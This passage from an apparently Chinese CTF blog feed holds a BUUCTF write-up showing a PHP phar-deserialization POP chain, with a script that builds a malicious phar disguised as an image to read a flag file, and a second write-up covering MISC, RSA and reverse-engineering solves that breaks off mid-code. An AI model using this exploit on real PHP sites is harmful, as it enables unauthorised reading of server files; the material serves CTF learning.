aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放在upload文件夹下</p><h3 id="function-php"><a href="#function-php" class="headerlink" title="function.php"></a>function.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>"; </span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">else</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>_show()</code>类中如果要进行文件读取获得flag文件可是文件名会被过滤，另找方法。<br>在Test类中存在<code>_get()</code>函数：当调用一个不存在的方法的时候触发<code>_get</code>，<code>__get</code>又会触发get函数，get又会触发<code>file_get</code>函数来读取文件，而<code>file_get</code>函数将文件内容进行base64加密。<br>那么就需要找一个不存在的方法来触发<code>__get</code>。在<code>Show</code>类中的<code>__tostring()</code>方法让<code>str[&#39;str&#39;]</code>变成<code>Test</code>类，然后再调用source就会触发。这里找到<code>__toString</code>的触发点，在把一个类当成字符串的时候才会触发，可以利用<code>C1e4r</code>类</p><p>总体思路：</p><blockquote><p>通过<code>C1e4r</code>，将<code>str</code>赋值为<code>Show</code>类，触发<code>__tostring</code>方法，将<code>str[&#39;str&#39;]</code>赋值为<code>Test</code>类调用<code>source</code>触发<code>Test</code>的<code>__get()</code>方法–&gt;<code>get</code>–&gt;<code>file_get</code>-&gt;<code>flag</code></p></blockquote><p>pop链子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token comment">//Test类中没有source属性，可以根据这个调用__get()函数</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token comment">//数组类型的数值</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//链子以$a为起点</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的phar文件改为png文件后缀然后上传<br><img src="https://img-blog.csdnimg.cn/direct/98a7438692fc4e4e80047777d1b117cf.png" alt="456"><br>然后访问upload文件夹<br><img src="https://img-blog.csdnimg.cn/direct/2949540fb11e4deb8a55e9fb6f71a348.png" alt="123"><br>使用phar协议读取文件<br><code>http://38b4a3d2-8682-421d-91a5-7adf667005a3.node4.buuoj.cn:81/file.php?file=phar://upload/a8814e077fc8a92d25a18efa7c4d87ec.jpg</code><br><img src="https://img-blog.csdnimg.cn/direct/d0894769fb9340acbfb61b581e2af7d6.png" alt="789"><br>将得到的源码进行base64解密拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="http://3143047748.github.io/categories/ctf/"/>
    
    
    <category term="buuctf" scheme="http://3143047748.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>2023金盾信安杯初赛wp</title>
    <link href="http://3143047748.github.io/2023/11/27/2023%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/"/>
    <id>http://3143047748.github.io/2023/11/27/2023%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/</id>
    <published>2023-11-27T03:40:05.000Z</published>
    <updated>2023-11-27T05:14:44.936Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第二次参加金盾信安杯了，记得去年参加是在寒假，由于“口罩原因”学校放假早，在进行完第二次考核之后就回家了，当时也没有学到什么。回到家由于知道自己要参加第一次省级赛事，不敢划水了。。。<br>第一次参加的时候应该也是8个小时（具体记不清了），我知道，我是真的做不出来题目，但是最后还是混了一个三等奖。<br>今年再次参加，本以为会有一个不错的成绩，可是从比赛名次上也看出来了自己还有很多不足，不算很高但也不是很低（混了一个一等），总感觉自己在很多方面还很欠缺，继续努力吧！！！！<br><img src="http://img-blog.csdnimg.cn/9810cd7ef58a439d83955da8bbfee715.png" alt="123"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="Hakiehs"><a href="#Hakiehs" class="headerlink" title="Hakiehs"></a>Hakiehs</h4><p>将attachment.vsdx文件后缀改为zip文件然后解压，在文件里找到这个图片<br><img src="http://img-blog.csdnimg.cn/b36eda2e38044c96a48e93abe63eda66.png" alt="132"><br>从上到下分别为botw、GERUDO、樊凡语<br><img src="http://img-blog.csdnimg.cn/d8573ea45667465daf701c0bc0fef025.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/f9e6f7ccb8364b968ba4b47b60bc55aa.png" alt="789"><br><img src="http://img-blog.csdnimg.cn/953ac6ba3cdb4453b4e1b2bbe784ba41.png" alt="789"><br>分别找出对应的字母<br>linkzeldaganon</p><h4 id="来都来了"><a href="#来都来了" class="headerlink" title="来都来了"></a>来都来了</h4><p><img src="http://img-blog.csdnimg.cn/ef40a915046f4e6c86bc91ca8d551122.png" alt="456"></p><p>附件打开直接弹出密码，拖进winhex里看是伪加密，将标志位改成00 00<br><img src="http://img-blog.csdnimg.cn/96011ab1639a469baf75a71dc8dfc076.png" alt="789"><br>另存为一个文件，打开得到一段txt文本文件<br><img src="http://img-blog.csdnimg.cn/35b002e18f4d4fc2b4137c7700f1d4a9.png" alt="789"><br>怀疑是base64进行解密后发现好像是一段字符串<br><img src="http://img-blog.csdnimg.cn/0e11ccaf0efc49ba871ad0eb61ab7c33.png" alt="123"><br>复制下来后拖进记事本缩小字体得到flag<br><img src="http://img-blog.csdnimg.cn/4dfefa8465334102949f8ab0e9ca822d.png" alt="789"><br>flag{cp2ae315-eef4-3fra-a768-cd9xb19cdk4e}</p><h4 id="芙宁娜"><a href="#芙宁娜" class="headerlink" title="芙宁娜"></a>芙宁娜</h4><p>打开图片进行将其中图片中的base64编码进行解码<br><img src="http://img-blog.csdnimg.cn/585800fcd81a469d9c778da2a9e57855.png" alt="798"><br>由于这个flag的格式是uuid</p><blockquote><p>标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (8-4-4-4-12)</p></blockquote><p>也就是说此时尾部还差4个字符，此时我们还没有想到爆破flag，就是先找到另外的解法，但是当时一位队员尝试爆破后4位字符（制作字典，抓包爆破，真的是可行的），最终得到了正确答案8e8f（由于比赛已经结束，现在无法根据返回包判断）<br><img src="http://img-blog.csdnimg.cn/772acfeb19ac44b891619d64039af44f.png" alt="456"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="我看看谁还不会RSA"><a href="#我看看谁还不会RSA" class="headerlink" title="我看看谁还不会RSA"></a>我看看谁还不会RSA</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> secretm <span class="token operator">=</span> secret<span class="token punctuation">.</span>flagp<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">37777</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># c = 8232151627233115772131180151146951323147507324390914513031444555762539986162650</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写如下脚本运行得到d、m的数值，得到的d值再赋值给e重新运行得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp<span class="token keyword">import</span> binasciip<span class="token operator">=</span><span class="token number">8666789885346075954502743436174521501697</span>q<span class="token operator">=</span><span class="token number">2449101960789395782044494299423558347143</span>e<span class="token operator">=</span><span class="token number">37777</span>c<span class="token operator">=</span><span class="token number">8232151627233115772131180151146951323147507324390914513031444555762539986162650</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://img-blog.csdnimg.cn/288c7d52921046af860a8d8f571e84e3.png" alt="456"><br><img src="http://img-blog.csdnimg.cn/d969fd08383c44edac8ad4eae731fc26.png" alt="789"><br>flag{r5a_Who_w0nt}</p><h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h4><p><img src="http://img-blog.csdnimg.cn/093d81a015d24558aad13b7f06d521c5.png" alt="789"><br>发现是64位，于是拖到64位ida里面<br>找到main函数进行F5反编译得到如下代码<br><img src="http://img-blog.csdnimg.cn/c4c2c01e1cba4c8f8526f3546eae7ab4.png" alt="789"><br>跟进关键函数sub_401AD0(v6);接着跟进sub_401850(Block);<br><img src="http://img-blog.csdnimg.cn/35c5af22280e443aa219c8d4ace47f16.png" alt="789"><br>V9为密文，上面的&amp;unk_473040,中有一些奇怪的数据，按C转汇编代码后<br><img src="http://img-blog.csdnimg.cn/a6e6b03bcdde412d9bad06f146e75874.png" alt="789"><br>选中汇编代码P创建函数F5反编译<br><img src="http://img-blog.csdnimg.cn/70064fc4a12a4550aa9cb655d43766d3.png" alt="789"><br>分析发现是类RC4解密算法，将题目给的密文用这段代码解密得到flag。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>    <span class="token keyword">void</span>  <span class="token 